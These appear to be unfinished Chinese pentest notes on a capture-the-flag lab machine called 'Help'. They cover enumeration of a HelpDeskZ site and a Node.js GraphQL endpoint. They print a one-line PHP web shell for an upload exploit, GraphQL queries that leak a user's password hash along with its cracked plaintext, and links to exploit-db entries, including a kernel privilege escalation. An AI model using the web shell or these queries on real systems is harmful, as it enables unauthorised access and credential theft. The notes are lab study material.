[toc]
# Help
- victim
	- 10.129.1.103
- local
	- 10.10.14.34
- [ ] AutoRecon已执行？

---

## Web服务分析(Port 80)

apache默认页面，扫一下目录，主要入口点找到

http://10.129.1.103/support/

Web服务框架是HelpDeskZ

尝试https://www.exploit-db.com/exploits/41200

测试了好像无效，未授权下载局限性很大，sql注入需要授权

http://10.129.1.103/support/UPGRADING.txt

看到是HelpDeskZ 1.0.2，找到合适的EXP，但都要先登陆

https://www.exploit-db.com/exploits/40300

任意文件上传，根据EXP说明，先上传，然后用脚本猜测

```php
<?php system($_POST["hack"]);?> 
```

## Web服务分析(port 3000,Node.js)

http://10.129.1.103:3000/

有一段json小提示

通过请求信息确定是`Node.js Express FrameWork`

Google搜索`node js express query language`，发现query地址是`/graphql`

进行查询，官网：https://graphql.cn/

`?query={user}`提示必须要包含子域，尝试username

`{user {username} }`

```
{"data":{"user":{"username":"helpme@helpme.com"}}}
```

`{user {username,password} }`

```
{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```

在线查询到是：godhelpmeplz

## 组合利用

接下来应该是结合账号密码和80端口的EXP拿到shell，并进行提权

`4.4.0-116-generic`  ->  https://www.exploit-db.com/exploits/44298

### 第二方案

也可以继续盲注，可以获取到admin也是root的密码，不需要再提权

---

但是这题VIP+不配做，不做了，等重新换普通VIP再来搞定